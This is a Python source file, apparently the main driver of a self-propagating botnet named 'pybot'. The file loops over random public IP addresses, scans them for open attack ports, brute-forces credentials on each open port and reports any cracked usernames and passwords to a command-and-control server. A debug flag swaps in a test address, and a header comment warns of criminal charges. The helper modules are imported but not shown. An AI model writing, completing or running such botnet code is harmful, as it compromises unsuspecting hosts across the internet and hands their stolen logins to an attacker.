# Main module that sets bot into motion
# WARNING! DO NOT RUN THIS UNLESS YOU PLAN ON SETTING THE BOTNET
# INTO MOTION! YOU WILL FACE SERIOUS CRIMINAL CHARGES!

import scan
import ip
import login
import report

from defs import CNC_SERV_ADDR, CNC_SERV_PORT, ATTACK_PORTS, DEBUG

if DEBUG:
    import resolve
    from defs import TEST_ADDR

def run():
    '''
        Initiates and executes the bot

        From here, all hell breaks loose, unless that debug flag is
        set!
    '''

    while True:
        if DEBUG:
            target = resolve.resolve_host(TEST_ADDR)
        else:
            target = ip.generate_random_public_ip()
        open_ports = scan.scan_ports(target, ATTACK_PORTS)
        for port in open_ports:
            (username, password) = login.brute_credentials(
                target,
                port
            )
            # Some default passwords are empty
            if username:
                report.report_new_bot_credentials(
                    CNC_SERV_ADDR,
                    CNC_SERV_PORT,
                    target,
                    port,
                    username,
                    password
                )

if __name__ == '__main__':
    print('Starting pybot')
    print('Have a nice day!\n')
    run()
